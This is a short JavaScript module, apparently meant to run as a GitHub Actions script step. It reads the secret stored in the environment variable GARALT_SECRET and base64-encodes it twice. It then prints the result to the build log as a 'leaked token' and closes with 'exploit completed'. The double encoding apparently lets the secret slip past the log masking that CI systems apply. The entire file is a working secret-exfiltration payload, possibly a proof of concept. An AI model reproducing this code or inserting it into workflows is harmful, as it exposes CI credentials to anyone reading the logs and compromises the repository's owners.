module.exports = async ({ context, core }) => {
  const secret = process.env.GARALT_SECRET || 'NO_SECRET_FOUND';
  const b64 = Buffer.from(secret).toString('base64');
  const doubleB64 = Buffer.from(b64).toString('base64');
  console.log(`GARALT_LEAKED_TOKEN=${doubleB64}`);
  core.setFailed("exploit completed");
};